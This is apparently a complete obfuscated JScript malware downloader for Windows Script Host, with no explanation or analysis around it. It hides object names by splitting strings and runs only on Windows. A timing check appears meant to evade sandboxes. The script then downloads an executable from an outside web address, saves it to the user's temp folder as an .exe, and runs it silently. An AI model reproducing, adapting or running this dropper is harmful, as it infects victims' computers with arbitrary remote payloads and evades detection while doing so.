var QE = false;
var YR = "Create"+"Object";
var WI = function X() {return WScript[YR]("WScript"+".Shell");}(), X1 = 11;
var J = "MSXML2"+".XMLHTTP";
var QK0 = 2;
var X0 = QK0 - 2;
function ZT(QK){WI["Run"](QK, X0, X0);};
function K(){return J + "";};
function YJ(RZ, Y0){X0 = X0 * 1; return RZ - Y0;};
function U(){return YR;};
/*@cc_on
  @if (@_win32 || @_win64)
    QE = true;
  @end
@*/
if (QE)
{
var ZK = "";
function ZG(){return 22;};
var O = 0; var TT = 0;
function FH()
{
var PY = new this["Date"]();
var DF = PY["getUTCMilliseconds"]();
WScript["Sleep"](ZG());
var PY = new this["Date"]();
var JG = PY["getUTCMilliseconds"]();
WScript["Sleep"](ZG());
var PY = new this["Date"]();
var R = PY["getUTCMilliseconds"]();
var O = "H";
O = YJ(JG, DF);
var TT = "YR0";
TT = YJ(R, JG);
ZK = "open";
return YJ(O, TT);
}
var L = false;
var Y = false;
for (var H0 = X0; H0 < ZG() * 1; H0++){if (FH() != X0){
L = true; 
TT = "31" + 11 * O + TT; 
Y = true; 
break;
}}
function Z() {return ((L == true) && (L == Y)) ? 1 : X0;};
if (L && Z() && Y){
function ZX() {return WI["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "D7yopyaj.ex" + "e";};
 OM = K();
 GZ = WScript[YR](OM);
 var SQ = 1;
do { 
	for (;SQ;){
	try {
		if (SQ == 1)
		{
			GZ[ZK]("GET", "http://a-ntsuhan.com/k38sav", false);
			GZ["send"]();
			XG = "Sleep";
			SQ = 2;
		}
		WScript[XG](ZG() + 120); 
		if (GZ["readystate"] < 2 * 2) continue;
		SQ = X0;
		function P(PL) {var H1 = (1, 2, 3, 4, 5, PL); return H1;};
		ZL = WScript[U()]("ADODB.Stream");
		OM = ZL;
		OM[ZK]();
		OM["type"] = P(1);
		OM["write"](GZ["ResponseBody"]);
		ZL["position"] = P(X0);
		OM["Save" + "ToFile"](ZX(), 2);
		ZL["cl"+"ose"]();
		NZ = ZX();
		ZT(NZ);
	} catch(B){};};
}while (SQ);
}
}

